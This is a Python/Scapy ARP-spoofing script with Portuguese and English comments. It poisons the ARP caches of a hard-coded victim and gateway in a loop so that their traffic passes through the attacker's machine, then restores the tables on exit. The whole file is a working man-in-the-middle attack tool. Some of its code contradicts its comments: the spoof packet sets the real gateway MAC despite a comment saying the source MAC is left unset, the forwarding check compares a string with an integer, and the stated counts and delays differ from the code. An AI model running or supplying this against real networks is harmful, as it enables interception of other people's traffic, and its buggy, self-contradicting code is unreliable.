from scapy.all import Ether, ARP, srp, send, sendp
import argparse
import time
import os
import sys
import random

# ARP spoofing faz que todos os pacotes na rede do alvo sejam roteados atraves do dispositivo que executa o codigo
# realizando o man in the middle

def enable_linux_iproute():
    """
    Habilitar o roteamento IP, processo fundamental para ser o Man in the Middle
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    # Arquivo no Linux no qual devemos alterar de 0 para 1, habilitando assim o mesmo
    with open(file_path) as f:
        # Abrir em modo leitura para verificar se ja esta habilitado
        if f.read() == 1:
            # se 1, nao realiza nenhuma modificacao, pois já está habilitado
            return
    with open(file_path, "w") as f:
        print(1, file=f)
        # Caso não esteja habilitado, setar como 1 para habilitar


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead

    Retorna o endereco MAC de qualquer dispositivo que esteja conectado na rede

    """
    # realiza um arp ping
    ans, pkt = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    # srp: -> envia e recebe pacotes na camada 2 e fica escutando por respostas,
    # nos enviamos ARP request e escutamos ARP response
    # Supersocket Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip) = enviar / receber pacotes,
    # TIMEOUT = quanto tempo esperar depois que o ultimo pacote ter sido enviado
    # verbose = detalhes
    #  ARP com campo de destino o IP
    # Campo mac de destino no ethernet camada 2
    # Resposta lista de resposta: ans e lista de pacotes : pkt
    if ans:
        # Se a lista tiver elementos entao retornaremos o mac da fonte
        #print("enderenco mac aqui: ", ans[0][1].src)
        return ans[0][1].hwsrc


def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    Faremos o spoof do ip alvo (target_ip), onde diremos temos o IP host (host_ip)
    mudando o cache da tabela ARP do target_ip.
    """
    # get the mac address of the target
    # pegaremos o endereco MAC do dispositivo com o target_ip
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    # cria o pacote malicioso ARP de resposta ARP com o target_ip, o target_mac dizendo que a fonte somos nos o host_ip
    # e a op que é is-at , quem tem esse endereco?
    # o hwsrc não e especificado pois por padrao é o mac do proprio pc que envia
    #arp_response = ARP(pdst=target_ip, hwdst=target_mac, hwsrc=host_mac, psrc=host_ip, op='is-at')
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, hwsrc=host_mac, psrc=host_ip, op=2)
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    # envia o pacote não printando nenhuma informacao ( verbose = 0)
    send(arp_response, verbose=0)
    if verbose:
        # se verbose for true, printaremos informacoes dos pacotes enviados pegando o mac da fonte
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations
    (real IP and MAC of `host_ip` ) to `target_ip`

    Precisamos restaurar o endereco real do dispositivo alvo e do gateway, pois se nao fizermos isso o alvo perdera a conexao de internet
    Isso é feito enviando as informacoes originais (ip real e mac do host_ip) para o alvo (target_ip)
    """
    # get the real MAC address of target
    # pegar o endereco mac real do alvo
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    # pegar o endereco real do mac do gateway (roteador) que estamos fazendo spoofing
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    # criaremos o pacore ARP de restauracao com as informacoes do ip e endereco mac do alvo,
    # e os enderecos reais de ip e mac da fonte
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op=2)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    # enviamos o pacote de restauracao para restaurar a rede a normalidade, enviamos 7 vezes como uma boa medida
    send(arp_response, verbose=0, count=15)
    if verbose:
        # se verbose for tru irá mostrar mais informacoes dos pacotes enviados
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if __name__ == "__main__":
    # victim ip address
    #target = "192.168.1.100"
    target = "172.20.10.2"
    # gateway ip address
    host = "172.20.10.1"
    #host = "192.168.1.1"
    #my_pc = "172.20.10.7"
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    # habilitar roteamento de ip no linux
    enable_linux_iproute()
    try:
        while True:
            # telling the `target` that we are the `host`
            # dizemos ao alvo que nos somos o host
            spoof(target, host, verbose)
            # telling the `host` that we are the `target`
            # dizemos ao host que nos somos o alvo
            spoof(host, target, verbose)
            # sleep for one second
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        for i in range(0, 5):
            # restaurar conexao do alvo falando o host verdadeiro
            restore(target, host)
            # restaurar conexao do host informando o target verdadeiro
            restore(host, target)



#send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),inter=RandNum(10,40), loop=1 )